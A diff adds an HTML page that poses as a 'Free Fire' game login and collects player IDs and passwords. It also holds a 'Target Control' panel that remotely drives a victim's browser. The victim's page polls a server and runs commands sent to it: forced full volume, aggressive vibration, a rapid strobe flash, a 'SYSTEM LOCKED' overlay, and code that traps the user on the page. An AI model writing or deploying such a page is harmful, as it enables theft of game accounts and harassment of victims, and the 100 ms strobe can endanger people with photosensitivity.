@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Free Fire • Cyber Panel</title>
+<style>
+  :root {
+    --neon-cyan: #00f0ff;
+    --neon-pink: #ff00a8;
+    --neon-purple: #9d00ff;
+    --bg-dark: #05060f;
+    --panel-bg: rgba(10, 14, 30, 0.85);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Courier New', monospace;
+    background: var(--bg-dark);
+    color: #d6f5ff;
+    min-height: 100vh;
+    overflow-x: hidden;
+    position: relative;
+  }
+  body::before {
+    content: "";
+    position: fixed;
+    inset: -50%;
+    background-image:
+      linear-gradient(rgba(0, 240, 255, 0.08) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0, 240, 255, 0.08) 1px, transparent 1px);
+    background-size: 48px 48px;
+    transform: perspective(500px) rotateX(60deg);
+    animation: gridMove 8s linear infinite;
+    z-index: -1;
+  }
+  @keyframes gridMove {
+    from { background-position: 0 0; }
+    to   { background-position: 0 48px; }
+  }
+  body::after {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg, rgba(0,0,0,0.25) 0px, rgba(0,0,0,0.25) 1px,
+      transparent 1px, transparent 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+    mix-blend-mode: overlay;
+  }
+  .glitch-title {
+    font-size: 28px;
+    font-weight: 900;
+    text-align: center;
+    color: var(--neon-cyan);
+    text-shadow: 0 0 8px var(--neon-cyan), 0 0 20px var(--neon-cyan), 0 0 40px var(--neon-pink);
+    letter-spacing: 4px;
+    margin-bottom: 6px;
+    animation: flicker 3s infinite;
+  }
+  @keyframes flicker {
+    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
+    20%, 22%, 24%, 55% { opacity: 0.6; }
+  }
+  .dev-tag {
+    text-align: center;
+    font-size: 11px;
+    color: var(--neon-pink);
+    letter-spacing: 3px;
+    margin-bottom: 22px;
+    text-shadow: 0 0 6px var(--neon-pink);
+  }
+  .dev-tag span {
+    color: var(--neon-cyan);
+    font-weight: bold;
+    text-shadow: 0 0 8px var(--neon-cyan);
+  }
+  .box, .panel {
+    max-width: 380px;
+    margin: 60px auto;
+    padding: 28px 24px;
+    background: var(--panel-bg);
+    border: 1px solid var(--neon-cyan);
+    border-radius: 10px;
+    box-shadow: 0 0 12px var(--neon-cyan), inset 0 0 12px rgba(0, 240, 255, 0.15);
+    backdrop-filter: blur(6px);
+    position: relative;
+  }
+  .box::before, .panel::before {
+    content: "";
+    position: absolute;
+    inset: -2px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, var(--neon-cyan), var(--neon-pink), var(--neon-purple));
+    z-index: -1;
+    filter: blur(6px);
+    opacity: 0.4;
+  }
+  h2 {
+    font-size: 16px;
+    color: var(--neon-cyan);
+    text-align: center;
+    letter-spacing: 2px;
+    margin-bottom: 20px;
+    text-transform: uppercase;
+    text-shadow: 0 0 6px var(--neon-cyan);
+  }
+  input {
+    width: 100%;
+    padding: 12px 14px;
+    margin: 8px 0;
+    background: rgba(0, 20, 30, 0.6);
+    border: 1px solid var(--neon-cyan);
+    border-radius: 6px;
+    color: #aef7ff;
+    font-family: inherit;
+    font-size: 14px;
+    outline: none;
+    transition: box-shadow 0.2s;
+  }
+  input:focus {
+    box-shadow: 0 0 10px var(--neon-cyan);
+    border-color: var(--neon-pink);
+  }
+  input::placeholder { color: #3a7a8a; }
+  button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 10px;
+    background: transparent;
+    color: var(--neon-cyan);
+    border: 1px solid var(--neon-cyan);
+    border-radius: 6px;
+    font-family: inherit;
+    font-weight: bold;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: 0.2s;
+    text-shadow: 0 0 6px var(--neon-cyan);
+  }
+  button:hover {
+    background: var(--neon-cyan);
+    color: #05060f;
+    box-shadow: 0 0 18px var(--neon-cyan), 0 0 40px var(--neon-pink);
+  }
+  .panel { display: none; max-width: 440px; }
+  .btn {
+    display: block;
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    background: rgba(20, 0, 30, 0.7);
+    color: var(--neon-pink);
+    border: 1px solid var(--neon-pink);
+    border-radius: 6px;
+    font-family: inherit;
+    font-size: 13px;
+    letter-spacing: 1px;
+    cursor: pointer;
+    text-align: left;
+    transition: 0.2s;
+    text-shadow: 0 0 6px var(--neon-pink);
+  }
+  .btn:hover {
+    background: var(--neon-pink);
+    color: #05060f;
+    box-shadow: 0 0 18px var(--neon-pink);
+  }
+  .btn.ok { color: #00ffb3; border-color: #00ffb3; text-shadow: 0 0 6px #00ffb3; }
+  .btn.ok:hover { background: #00ffb3; color: #05060f; box-shadow: 0 0 18px #00ffb3; }
+  .btn.warn { color: #ff3d3d; border-color: #ff3d3d; text-shadow: 0 0 6px #ff3d3d; }
+  .btn.warn:hover { background: #ff3d3d; color: #05060f; box-shadow: 0 0 18px #ff3d3d; }
+  footer {
+    text-align: center;
+    font-size: 10px;
+    color: #3a7a8a;
+    letter-spacing: 2px;
+    margin: 40px 0 20px;
+  }
+  footer span { color: var(--neon-pink); text-shadow: 0 0 6px var(--neon-pink); }
+</style>
+</head>
+<body>
+
+<div class="box" id="loginBox">
+  <div class="glitch-title">FREE FIRE</div>
+  <div class="dev-tag">DEVELOPER: <span>RILZZY DEX</span></div>
+  <h2>// Secure Login //</h2>
+  <form method="POST" action="/api?action=login">
+    <input name="username" placeholder="ID Free Fire" required>
+    <input name="password" type="password" placeholder="Password" required>
+    <button type="submit">ACCESS SYSTEM</button>
+  </form>
+</div>
+
+<div class="panel" id="panelBox">
+  <div class="glitch-title">CONTROL NODE</div>
+  <div class="dev-tag">DEVELOPER: <span>RILZZY DEX</span></div>
+  <h2>// Target Control //</h2>
+  <button class="btn ok" onclick="kirim('vol_force')">▸ Volume Force 100%</button>
+  <button class="btn" onclick="kirim('vib_agg')">▸ Aggressive Vibration</button>
+  <button class="btn" onclick="kirim('flash_strobo')">▸ Flashlight Strobo</button>
+  <button class="btn warn" onclick="kirim('force_lock')">▸ Force Lock</button>
+  <button class="btn ok" onclick="kirim('unlock')">▸ Unlock</button>
+  <button class="btn" onclick="kirim('anti_close')">▸ Anti Tutup Web</button>
+  <button class="btn" onclick="kirim('anti_uninstall')">▸ Anti Uninstall</button>
+</div>
+
+<footer>© 2026 <span>RILZZY DEX</span> • CYBER PANEL v2.0</footer>
+
+<script>
+const params = new URLSearchParams(location.search);
+const token = params.get("token");
+
+if (token) {
+  document.getElementById("loginBox").style.display = "none";
+  document.getElementById("panelBox").style.display = "block";
+
+  let overlay = null;
+  let stroboInt = null;
+
+  async function poll() {
+    try {
+      const r = await fetch("/api?action=agent&token=" + token);
+      const d = await r.json();
+      jalankan(d.cmd);
+    } catch(e) {}
+    setTimeout(poll, 5000);
+  }
+
+  function jalankan(cmd) {
+    switch(cmd) {
+      case "vol_force":
+        document.querySelectorAll("audio,video").forEach(m => m.volume = 1);
+        break;
+      case "vib_agg":
+        if (navigator.vibrate) navigator.vibrate([500,100,500,100,500,100]);
+        break;
+      case "flash_strobo":
+        if (stroboInt) clearInterval(stroboInt);
+        let on = false;
+        stroboInt = setInterval(() => {
+          on = !on;
+          document.body.style.background = on ? "#ffffff" : "#05060f";
+        }, 100);
+        break;
+      case "force_lock":
+        if (!overlay) {
+          overlay = document.createElement("div");
+          overlay.style.cssText = "position:fixed;inset:0;background:#000;z-index:999999;color:#00f0ff;display:flex;align-items:center;justify-content:center;font-size:20px;font-family:'Courier New',monospace;text-shadow:0 0 12px #00f0ff;letter-spacing:3px;";
+          overlay.textContent = "SYSTEM LOCKED";
+          document.body.appendChild(overlay);
+        }
+        break;
+      case "unlock":
+        if (overlay) { overlay.remove(); overlay = null; }
+        break;
+      case "anti_close":
+        window.addEventListener("beforeunload", e => { e.preventDefault(); e.returnValue = ""; });
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
+        break;
+      case "anti_uninstall":
+        break;
+    }
+  }
+
+  poll();
+}
+
+window.kirim = async function(cmd) {
+  await fetch("/api?action=agent&token=" + token + "&set=" + cmd);
+  alert("Perintah dikirim: " + cmd);
+};
+</script>
+</body>
+</html>
